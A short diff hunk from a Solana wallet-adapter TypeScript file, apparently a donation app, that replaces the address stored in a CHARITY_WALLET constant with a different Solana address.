@@ -9,7 +9,7 @@ import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
 import { createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 
-const CHARITY_WALLET = '5xJQUuGTJr2Hrwu6oHkHGiQfpNXRWRFaPC9Xjx82wovh';
+const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
 
 interface TokenBalance {
